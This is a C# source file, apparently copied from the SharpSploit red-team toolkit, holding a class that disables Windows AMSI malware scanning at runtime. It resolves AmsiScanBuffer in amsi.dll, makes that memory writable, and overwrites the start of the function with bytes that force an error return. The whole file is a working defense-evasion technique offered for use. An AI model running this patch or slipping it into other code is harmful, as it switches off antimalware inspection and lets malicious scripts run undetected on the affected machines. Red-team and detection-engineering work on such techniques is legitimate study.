// https://github.com/cobbr/SharpSploit/blob/4bf3d2aa44d73b674867a1d28cc90a3bd54f100f/SharpSploit/Evasion/Amsi.cs
using System;
using System.Runtime.InteropServices;

public class AWSI
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr LoadLibrary(
            string lpFileName
    );
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName
    );
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    /// <summary>
    /// Patch the AmsiScanBuffer function in amsi.dll.
    /// </summary>
    /// <author>Daniel Duggan (@_RastaMouse)</author>
    /// <returns>Bool. True if succeeded, otherwise false.</returns>
    /// <remarks>
    /// Credit to Adam Chester (@_xpn_).
    /// </remarks>
    public static bool Patch()
    {
        byte[] patch;
        if (Is64Bit)
        {
            patch = new byte[6];
            patch[0] = 0xB8;
            patch[1] = 0x57;
            patch[2] = 0x00;
            patch[3] = 0x07;
            patch[4] = 0x80;
            patch[5] = 0xc3;
        }
        else
        {
            patch = new byte[8];
            patch[0] = 0xB8;
            patch[1] = 0x57;
            patch[2] = 0x00;
            patch[3] = 0x07;
            patch[4] = 0x80;
            patch[5] = 0xc2;
            patch[6] = 0x18;
            patch[7] = 0x00;
        }

        try
        {
            var library = LoadLibrary("amsi.dll");
            var address = GetProcAddress(library, "AmsiScanBuffer");
            uint oldProtect;
            VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, address, patch.Length);
            VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            return true;
        }
        catch (Exception e)
        {
            Console.Error.WriteLine("Exception: " + e.Message);
        }
        return false;
    }
    public static bool Is64Bit
    {
        get { return IntPtr.Size == 8; }
    }
}
